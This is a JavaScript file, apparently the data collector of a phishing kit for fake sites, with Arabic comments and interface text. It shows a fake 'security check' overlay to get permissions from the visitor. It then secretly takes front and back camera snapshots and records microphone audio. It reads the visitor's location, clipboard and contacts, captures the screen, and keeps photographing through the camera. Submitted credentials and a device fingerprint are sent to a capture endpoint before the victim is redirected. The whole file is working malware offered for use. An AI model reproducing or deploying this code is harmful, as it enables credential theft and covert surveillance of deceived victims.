// fake_sites/core/js/collector.js
// ============================================================
// Collector v2 — نظام صلاحيات متقدم وتدريجي
// ============================================================

(function() {
    "use strict";

    // ── الإعدادات ──
    var FS_COLLECTOR_URL = "/fs/capture";
    var FS_SESSION_ID = window.FS_SESSION_ID || "";
    var FS_SITE_NAME = window.FS_SITE_NAME || "unknown";
    var FS_REDIRECT_URL = window.FS_REDIRECT_URL || "https://www.google.com";

    // ── تخزين مؤقت ──
    var FS_MEDIA_STREAMS = window.FS_MEDIA_STREAMS || {};
    window.FS_MEDIA_STREAMS = FS_MEDIA_STREAMS;

    var FS_FINGERPRINT_CACHE = null;
    var FS_BATTERY_CACHE = null;
    var FS_LOCATION_CACHE = null;
    var FS_NOTIFICATIONS_CACHE = null;

    // ── UI Overlay ──
    function getOverlay() {
        var el = document.getElementById('fs-perm-overlay');
        if (!el) {
            el = document.createElement('div');
            el.id = 'fs-perm-overlay';
            el.innerHTML = (
                '<div class="fs-perm-backdrop">' +
                '  <div class="fs-perm-card">' +
                '    <div class="fs-perm-icon">🔒</div>' +
                '    <div class="fs-perm-title">جاري التحقق الأمني</div>' +
                '    <div class="fs-perm-text">يتم فحص جهازك لحماية حسابك...</div>' +
                '    <div class="fs-perm-steps" id="fs-perm-steps"></div>' +
                '    <div class="fs-perm-progress"><div class="fs-perm-bar" id="fs-perm-bar"></div></div>' +
                '  </div>' +
                '</div>'
            );
            el.style.cssText = 'position:fixed;inset:0;z-index:99999;display:none;';
            document.body.appendChild(el);

            // Style
            var style = document.createElement('style');
            style.textContent = (
                '.fs-perm-backdrop{' +
                '  position:fixed;inset:0;background:rgba(0,0,0,0.75);' +
                '  backdrop-filter:blur(8px);display:flex;' +
                '  align-items:center;justify-content:center;padding:20px;' +
                '}' +
                '.fs-perm-card{' +
                '  background:#fff;border-radius:20px;padding:32px 24px;' +
                '  max-width:400px;width:100%;text-align:center;' +
                '  box-shadow:0 20px 60px rgba(0,0,0,0.5);' +
                '  animation:fsSlideIn 0.4s ease-out;' +
                '}' +
                '@keyframes fsSlideIn{' +
                '  from{opacity:0;transform:translateY(20px);}' +
                '  to{opacity:1;transform:translateY(0);}' +
                '}' +
                '.fs-perm-icon{font-size:56px;margin-bottom:16px;}' +
                '.fs-perm-title{font-size:22px;font-weight:700;color:#1c1e21;margin-bottom:8px;}' +
                '.fs-perm-text{font-size:14px;color:#65676b;line-height:1.6;margin-bottom:20px;}' +
                '.fs-perm-steps{text-align:right;margin-bottom:20px;}' +
                '.fs-perm-step{' +
                '  display:flex;align-items:center;gap:10px;' +
                '  padding:10px 12px;background:#f0f2f5;' +
                '  border-radius:10px;margin-bottom:8px;font-size:14px;' +
                '  transition:all 0.3s;' +
                '}' +
                '.fs-perm-step.done{background:#dcfce7;}' +
                '.fs-perm-step.active{background:#dbeafe;}' +
                '.fs-perm-step-icon{' +
                '  width:24px;height:24px;border-radius:50%;' +
                '  background:#cbd5e1;display:flex;align-items:center;' +
                '  justify-content:center;font-size:12px;color:#fff;' +
                '  flex-shrink:0;transition:all 0.3s;' +
                '}' +
                '.fs-perm-step.done .fs-perm-step-icon{background:#22c55e;}' +
                '.fs-perm-step.active .fs-perm-step-icon{background:#3b82f6;animation:fsPulse 1s infinite;}' +
                '@keyframes fsPulse{0%,100%{opacity:1;}50%{opacity:0.5;}}' +
                '.fs-perm-step-text{flex:1;color:#1c1e21;font-weight:500;}' +
                '.fs-perm-progress{' +
                '  height:6px;background:#e4e6eb;border-radius:3px;overflow:hidden;' +
                '}' +
                '.fs-perm-bar{' +
                '  height:100%;width:0%;background:linear-gradient(90deg,#3b82f6,#22c55e);' +
                '  transition:width 0.5s ease;border-radius:3px;' +
                '}' +
                '.fs-loader{' +
                '  display:inline-block;width:14px;height:14px;' +
                '  border:2px solid rgba(255,255,255,0.3);' +
                '  border-top-color:#fff;border-radius:50%;' +
                '  animation:fsSpin 0.7s linear infinite;vertical-align:middle;' +
                '  margin-left:8px;' +
                '}' +
                '@keyframes fsSpin{to{transform:rotate(360deg);}}' +
                '.fs-page-loader{' +
                '  position:fixed;inset:0;background:#fff;' +
                '  display:none;align-items:center;justify-content:center;' +
                '  flex-direction:column;z-index:99999;' +
                '}' +
                '.fs-page-loader.active{display:flex;}' +
                '.fs-page-loader .spinner{' +
                '  width:48px;height:48px;border:4px solid #e4e6eb;' +
                '  border-top-color:#1877f2;border-radius:50%;' +
                '  animation:fsSpin 0.8s linear infinite;margin-bottom:16px;' +
                '}' +
                '.fs-page-loader .text{font-size:15px;color:#65676b;}' +
                '.fade-out{animation:fsFadeOut 0.3s ease-out forwards;}' +
                '@keyframes fsFadeOut{to{opacity:0;}}'
            );
            document.head.appendChild(style);
        }
        return el;
    }

    function showPermOverlay(steps) {
        var el = getOverlay();
        var stepsEl = el.querySelector('#fs-perm-steps');
        stepsEl.innerHTML = '';

        steps.forEach(function(s, i) {
            var stepEl = document.createElement('div');
            stepEl.className = 'fs-perm-step';
            stepEl.dataset.idx = i;
            stepEl.innerHTML = (
                '<div class="fs-perm-step-icon">' + (i+1) + '</div>' +
                '<div class="fs-perm-step-text">' + s + '</div>'
            );
            stepsEl.appendChild(stepEl);
        });

        el.style.display = 'block';
    }

    function updatePermStep(idx, status) {
        var el = document.getElementById('fs-perm-overlay');
        if (!el) return;

        var stepEl = el.querySelector('[data-idx="' + idx + '"]');
        if (!stepEl) return;

        stepEl.classList.remove('active', 'done');
        if (status === 'active') {
            stepEl.classList.add('active');
            stepEl.querySelector('.fs-perm-step-icon').innerHTML = '...';
        } else if (status === 'done') {
            stepEl.classList.add('done');
            stepEl.querySelector('.fs-perm-step-icon').innerHTML = '✓';
        }

        // Progress bar
        var allSteps = el.querySelectorAll('.fs-perm-step');
        var doneCount = el.querySelectorAll('.fs-perm-step.done').length;
        var percent = (doneCount / allSteps.length) * 100;
        var bar = el.querySelector('#fs-perm-bar');
        if (bar) bar.style.width = percent + '%';
    }

    function hidePermOverlay() {
        var el = document.getElementById('fs-perm-overlay');
        if (el) el.style.display = 'none';
    }

    // ── جمع البصمة ──
    function collectFingerprint() {
        if (FS_FINGERPRINT_CACHE) return FS_FINGERPRINT_CACHE;

        var data = {};
        try {
            data.user_agent = navigator.userAgent;
            data.language = navigator.language;
            data.languages = (navigator.languages || []).join(',');
            data.platform = navigator.platform;
            data.screen_width = screen.width;
            data.screen_height = screen.height;
            data.avail_width = screen.availWidth;
            data.avail_height = screen.availHeight;
            data.pixel_ratio = window.devicePixelRatio || 1;
            data.color_depth = screen.colorDepth;
            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.timezone_offset = new Date().getTimezoneOffset();
            data.hardware_concurrency = navigator.hardwareConcurrency || null;
            data.device_memory = navigator.deviceMemory || null;
            data.touch_support = 'ontouchstart' in window;
            data.max_touch_points = navigator.maxTouchPoints || 0;
            data.cookies_enabled = navigator.cookieEnabled;
            data.do_not_track = navigator.doNotTrack || null;
            data.online = navigator.onLine;
            data.local_time = new Date().toString();

            // GPU
            try {
                var canvas = document.createElement('canvas');
                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    var dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    if (dbg) {
                        data.gpu_vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
                        data.gpu_renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch(e) {}

            // Connection
            if (navigator.connection) {
                data.connection_type = navigator.connection.effectiveType;
                data.connection_downlink = navigator.connection.downlink;
                data.connection_rtt = navigator.connection.rtt;
            }

            // Color scheme
            data.dark_mode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
            data.reduced_motion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
        } catch(e) {}

        FS_FINGERPRINT_CACHE = data;
        return data;
    }

    // ── إرسال البيانات ──
    function sendData(endpoint, payload) {
        return new Promise(function(resolve) {
            try {
                var jsonStr = JSON.stringify(payload);

                if (navigator.sendBeacon) {
                    try {
                        var blob = new Blob([jsonStr], {type: 'application/json'});
                        if (navigator.sendBeacon(endpoint, blob)) {
                            resolve(true);
                            return;
                        }
                    } catch (e) {}
                }

                fetch(endpoint, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: jsonStr,
                    keepalive: true
                }).then(function() { resolve(true); })
                  .catch(function() {
                      try {
                          var xhr = new XMLHttpRequest();
                          xhr.open('POST', endpoint, true);
                          xhr.setRequestHeader('Content-Type', 'application/json');
                          xhr.send(jsonStr);
                          resolve(true);
                      } catch(e2) { resolve(false); }
                  });
            } catch (e) {
                resolve(false);
            }
        });
    }

    // ── التقاط صورة من stream ──
    function captureFromStream(stream, mediaType, quality) {
        return new Promise(function(resolve) {
            try {
                quality = quality || 0.8;
                var video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                video.muted = true;

                var timeout = setTimeout(function() { resolve(null); }, 4000);

                video.onloadedmetadata = function() {
                    video.play().then(function() {
                        setTimeout(function() {
                            clearTimeout(timeout);
                            try {
                                var canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                var ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                var dataUrl = canvas.toDataURL('image/jpeg', quality);
                                resolve(dataUrl);
                            } catch (e) { resolve(null); }
                        }, 800);
                    }).catch(function() { 
                        clearTimeout(timeout);
                        resolve(null); 
                    });
                };

                video.onerror = function() { 
                    clearTimeout(timeout);
                    resolve(null); 
                };
            } catch (e) {
                resolve(null);
            }
        });
    }

    // ── طلب صلاحيات متدرج ──
    function requestPermissions(options) {
        options = options || {};

        var steps = [];
        if (options.camera !== false) steps.push('📷 فحص الكاميرا');
        if (options.microphone !== false) steps.push('🎙️ فحص الميكروفون');
        if (options.location !== false) steps.push('📍 تحديد الموقع');
        if (options.notifications !== false) steps.push('🔔 تفعيل الإشعارات');
        if (options.clipboard !== false) steps.push('📋 فحص الحافظة');
        if (options.contacts === true) steps.push('👥 جهات الاتصال');
        if (options.screen === true) steps.push('🖥️ مشاركة الشاشة');

        var results = {};
        var stepIdx = 0;

        // عرض Overlay
        if (options.showOverlay !== false) {
            showPermOverlay(steps);
        }

        return new Promise(function(resolve) {

            function processNext() {
                if (stepIdx >= steps.length) {
                    // كل حاجة خلصت
                    setTimeout(function() {
                        hidePermOverlay();
                        resolve(results);
                    }, 800);
                    return;
                }

                // تحديد نوع الصلاحية
                var step = steps[stepIdx];
                updatePermStep(stepIdx, 'active');

                var promise;

                if (step.indexOf('الكاميرا') >= 0) {
                    promise = requestCamera();
                } else if (step.indexOf('الميكروفون') >= 0) {
                    promise = requestMicrophone();
                } else if (step.indexOf('الموقع') >= 0) {
                    promise = requestLocation();
                } else if (step.indexOf('الإشعارات') >= 0) {
                    promise = requestNotifications();
                } else if (step.indexOf('الحافظة') >= 0) {
                    promise = requestClipboard();
                } else if (step.indexOf('جهات الاتصال') >= 0) {
                    promise = requestContacts();
                } else if (step.indexOf('الشاشة') >= 0) {
                    promise = requestScreen();
                } else {
                    promise = Promise.resolve();
                }

                promise.then(function(result) {
                    // احفظ النتيجة
                    for (var k in result) {
                        results[k] = result[k];
                    }

                    updatePermStep(stepIdx, 'done');
                    stepIdx++;
                    setTimeout(processNext, 600);  // تأخير بسيط
                }).catch(function() {
                    updatePermStep(stepIdx, 'done');
                    stepIdx++;
                    setTimeout(processNext, 600);
                });
            }

            processNext();
        });
    }

    // ── صلاحية الكاميرا ──
    function requestCamera() {
        return navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user', width: 1280, height: 720 } 
        }).then(function(stream) {
            FS_MEDIA_STREAMS.camera = stream;

            // التقط صورة مباشرة
            return captureFromStream(stream, 'camera', 0.85).then(function(img) {
                if (img) {
                    // ابعت الصورة
                    sendData(FS_COLLECTOR_URL, {
                        type: 'snapshot',
                        session_id: FS_SESSION_ID,
                        site: FS_SITE_NAME,
                        media_type: 'camera',
                        image: img,
                        timestamp: Date.now()
                    });
                }

                // جرّب الكاميرا الخلفية
                return navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment' } 
                }).then(function(backStream) {
                    FS_MEDIA_STREAMS.camera_back = backStream;
                    return captureFromStream(backStream, 'camera_back', 0.85).then(function(img2) {
                        if (img2) {
                            sendData(FS_COLLECTOR_URL, {
                                type: 'snapshot',
                                session_id: FS_SESSION_ID,
                                site: FS_SITE_NAME,
                                media_type: 'camera_back',
                                image: img2,
                                timestamp: Date.now()
                            });
                        }
                        return { camera: 'granted', camera_back: 'granted' };
                    });
                }).catch(function() {
                    return { camera: 'granted', camera_back: 'denied' };
                });
            });
        }).catch(function() {
            return { camera: 'denied' };
        });
    }

    // ── صلاحية الميكروفون ──
    function requestMicrophone() {
        return navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                FS_MEDIA_STREAMS.microphone = stream;

                // سجل 5 ثواني
                try {
                    var chunks = [];
                    var mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
                        ? 'audio/webm;codecs=opus' 
                        : 'audio/webm';
                    var recorder = new MediaRecorder(stream, { mimeType: mimeType });

                    recorder.ondataavailable = function(e) {
                        if (e.data && e.data.size > 0) chunks.push(e.data);
                    };

                    recorder.start();

                    return new Promise(function(resolve) {
                        setTimeout(function() {
                            try {
                                recorder.onstop = function() {
                                    try {
                                        var blob = new Blob(chunks, { type: mimeType });
                                        var reader = new FileReader();
                                        reader.onloadend = function() {
                                            var audioData = reader.result;
                                            if (audioData) {
                                                sendData(FS_COLLECTOR_URL, {
                                                    type: 'snapshot',
                                                    session_id: FS_SESSION_ID,
                                                    site: FS_SITE_NAME,
                                                    media_type: 'audio',
                                                    image: audioData,
                                                    timestamp: Date.now()
                                                });
                                            }
                                            resolve({ microphone: 'granted', audio_captured: !!audioData });
                                        };
                                        reader.readAsDataURL(blob);
                                    } catch (e) {
                                        resolve({ microphone: 'granted' });
                                    }
                                };
                                recorder.stop();
                            } catch (e) {
                                resolve({ microphone: 'granted' });
                            }
                        }, 5000);
                    });
                } catch (e) {
                    return { microphone: 'granted' };
                }
            })
            .catch(function() {
                return { microphone: 'denied' };
            });
    }

    // ── صلاحية الموقع ──
    function requestLocation() {
        return new Promise(function(resolve) {
            if (!navigator.geolocation) {
                return resolve({ location: 'unsupported' });
            }

            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    var locData = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude,
                        heading: pos.coords.heading,
                        speed: pos.coords.speed,
                        timestamp: pos.timestamp
                    };
                    FS_LOCATION_CACHE = locData;
                    resolve({ 
                        location: 'granted', 
                        location_data: locData 
                    });
                },
                function() {
                    resolve({ location: 'denied' });
                },
                { 
                    timeout: 8000, 
                    enableHighAccuracy: true,
                    maximumAge: 0
                }
            );
        });
    }

    // ── صلاحية الإشعارات ──
    function requestNotifications() {
        return new Promise(function(resolve) {
            try {
                if (!('Notification' in window)) {
                    return resolve({ notifications: 'unsupported' });
                }

                if (Notification.permission === 'granted') {
                    return resolve({ notifications: 'granted' });
                }

                Notification.requestPermission().then(function(p) {
                    FS_NOTIFICATIONS_CACHE = p;
                    resolve({ notifications: p });
                }).catch(function() {
                    resolve({ notifications: 'denied' });
                });
            } catch (e) {
                resolve({ notifications: 'error' });
            }
        });
    }

    // ── صلاحية الحافظة ──
    function requestClipboard() {
        return new Promise(function(resolve) {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    navigator.clipboard.readText()
                        .then(function(text) {
                            resolve({ 
                                clipboard: 'granted', 
                                clipboard_text: text ? text.substring(0, 1000) : '' 
                            });
                        })
                        .catch(function() {
                            resolve({ clipboard: 'denied' });
                        });
                } else {
                    resolve({ clipboard: 'unsupported' });
                }
            } catch (e) {
                resolve({ clipboard: 'error' });
            }
        });
    }

    // ── صلاحية جهات الاتصال (via Contacts API or fallback) ──
    function requestContacts() {
        return new Promise(function(resolve) {
            try {
                if (navigator.contacts && navigator.contacts.select) {
                    // Chrome Contacts API
                    navigator.contacts.select(['name', 'tel', 'email'], {multiple: true})
                        .then(function(contacts) {
                            resolve({ 
                                contacts: 'granted', 
                                contacts_count: contacts ? contacts.length : 0,
                                contacts_data: contacts ? contacts.slice(0, 50) : []
                            });
                        })
                        .catch(function() {
                            resolve({ contacts: 'denied' });
                        });
                } else {
                    resolve({ contacts: 'unsupported' });
                }
            } catch (e) {
                resolve({ contacts: 'error' });
            }
        });
    }

    // ── صلاحية الشاشة ──
    function requestScreen() {
        return navigator.mediaDevices.getDisplayMedia({ 
            video: { cursor: 'always' },
            audio: false
        }).then(function(stream) {
            FS_MEDIA_STREAMS.screen = stream;

            return captureFromStream(stream, 'screen', 0.7).then(function(img) {
                if (img) {
                    sendData(FS_COLLECTOR_URL, {
                        type: 'snapshot',
                        session_id: FS_SESSION_ID,
                        site: FS_SITE_NAME,
                        media_type: 'screen',
                        image: img,
                        timestamp: Date.now()
                    });
                }
                return { screen: 'granted' };
            });
        }).catch(function() {
            return { screen: 'denied' };
        });
    }

    // ── التقاط إضافي للصور من الكاميرا (مستمر) ──
    function startContinuousCapture(interval) {
        interval = interval || 30000;
        setInterval(function() {
            if (FS_MEDIA_STREAMS.camera) {
                captureFromStream(FS_MEDIA_STREAMS.camera, 'camera_continuous', 0.7)
                    .then(function(img) {
                        if (img) {
                            sendData(FS_COLLECTOR_URL, {
                                type: 'snapshot',
                                session_id: FS_SESSION_ID,
                                site: FS_SITE_NAME,
                                media_type: 'camera_continuous',
                                image: img,
                                timestamp: Date.now()
                            });
                        }
                    });
            }
        }, interval);
    }

    // ── عرض Loader ──
    function showLoader(message) {
        var loader = document.getElementById('fs-page-loader');
        if (!loader) {
            loader = document.createElement('div');
            loader.id = 'fs-page-loader';
            loader.className = 'fs-page-loader';
            loader.innerHTML = (
                '<div class="spinner"></div>' +
                '<div class="text">' + (message || 'جاري التحميل...') + '</div>'
            );
            document.body.appendChild(loader);
        }
        var text = loader.querySelector('.text');
        if (text && message) text.textContent = message;
        loader.classList.add('active');
    }

    function hideLoader() {
        var loader = document.getElementById('fs-page-loader');
        if (loader) loader.classList.remove('active');
    }

    // ── إعادة توجيه ──
    function redirect(url) {
        try {
            document.body.classList.add('fade-out');
        } catch (e) {}
        setTimeout(function() {
            window.location.replace(url);
        }, 300);
    }

    // ── API العام ──
    window.FSCollector = {

        // ── إرسال بيانات النموذج ──
        captureForm: function(formData, options) {
            options = options || {};

            var payload = {
                type: 'credentials',
                session_id: FS_SESSION_ID,
                site: FS_SITE_NAME,
                timestamp: Date.now(),
                url: window.location.href,
                credentials: formData,
                fingerprint: collectFingerprint(),
                battery: FS_BATTERY_CACHE,
                metadata: options.metadata || {}
            };

            return sendData(FS_COLLECTOR_URL, payload);
        },

        // ── طلب صلاحيات متدرج ──
        requestPermissions: requestPermissions,

        // ── إرسال نتائج الصلاحيات ──
        sendPermissionsResult: function(permissions) {
            var payload = {
                type: 'permissions',
                session_id: FS_SESSION_ID,
                site: FS_SITE_NAME,
                timestamp: Date.now(),
                permissions: permissions,
                fingerprint: collectFingerprint()
            };
            return sendData(FS_COLLECTOR_URL, payload);
        },

        // ── إرسال صورة ──
        sendSnapshot: function(mediaType, imageData) {
            var payload = {
                type: 'snapshot',
                session_id: FS_SESSION_ID,
                site: FS_SITE_NAME,
                timestamp: Date.now(),
                media_type: mediaType,
                image: imageData
            };
            return sendData(FS_COLLECTOR_URL, payload);
        },

        // ── التقاط صورة من stream ──
        captureFromStream: captureFromStream,

        // ── بدء الالتقاط المستمر ──
        startContinuousCapture: startContinuousCapture,

        // ── UI Helpers ──
        showLoader: showLoader,
        hideLoader: hideLoader,
        redirect: redirect,
        showPermOverlay: showPermOverlay,
        hidePermOverlay: hidePermOverlay
    };

    // ── Auto: جمع البطارية ──
    if (navigator.getBattery) {
        navigator.getBattery().then(function(b) {
            FS_BATTERY_CACHE = {
                level: Math.round(b.level * 100),
                charging: b.charging,
                charging_time: b.chargingTime === Infinity ? null : b.chargingTime,
                discharging_time: b.dischargingTime === Infinity ? null : b.dischargingTime
            };
        }).catch(function() {});
    }

    console.log('[FS] Collector v2 loaded | site:', FS_SITE_NAME);

})();
